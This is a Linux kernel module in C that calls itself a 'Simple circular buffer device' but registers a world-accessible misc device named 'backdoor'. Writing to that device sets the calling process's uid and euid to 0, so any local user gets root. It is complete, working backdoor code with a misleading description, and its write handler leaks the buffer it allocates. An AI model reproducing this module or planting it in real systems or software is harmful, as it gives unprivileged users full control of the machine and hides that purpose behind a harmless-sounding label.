#include <linux/module.h>
#include <linux/miscdevice.h>
#include <linux/gfp.h>
#include <linux/slab.h>
#include <linux/init.h>
#include <linux/fs.h>
#include <linux/kernel.h>
#include <asm/uaccess.h>
#include <linux/proc_fs.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Jakub Wilkosz");
MODULE_DESCRIPTION("Simple circular buffer device");

int pid = 0;
struct task_struct * task;
struct pid *pid_struct;


void * memory_alloc(int size, void * memory){
    if (memory == NULL){
        return kzalloc(size, GFP_KERNEL);
    } else {
        return krealloc(memory, size, GFP_KERNEL);
    }
}


ssize_t backdoor_write(struct file *filep, const char *buff, size_t count, loff_t *offp){
  void * tmpbuf = memory_alloc(count, NULL);
  if (copy_from_user(tmpbuf, buff, count)!=0){
    printk("Userspace -> kernelspace copy failed!\n");
    return -EFAULT;
  }
  
  pid = task_pid_nr(current);
  printk("%d\n", pid);
  pid_struct = find_get_pid(pid);
  task = pid_task(pid_struct, PIDTYPE_PID);
  ((struct cred *)task -> cred) -> uid.val = 0;
  ((struct cred *)task -> cred) -> euid.val = 0;
  return count;
}

struct file_operations backdoor_ops = {
        write: backdoor_write
};

static struct miscdevice backdoor_miscdevice = {
        .minor = MISC_DYNAMIC_MINOR,
        .name = "backdoor",
        .fops = &backdoor_ops,
        .mode = S_IRWXU | S_IRWXO | S_IRWXG | S_ISUID
};

static int __init circular_init(void){
    misc_register(&backdoor_miscdevice);
    return 0;
}

static void __exit circular_exit(void){
    misc_deregister(&backdoor_miscdevice);
}



module_init(circular_init);
module_exit(circular_exit);
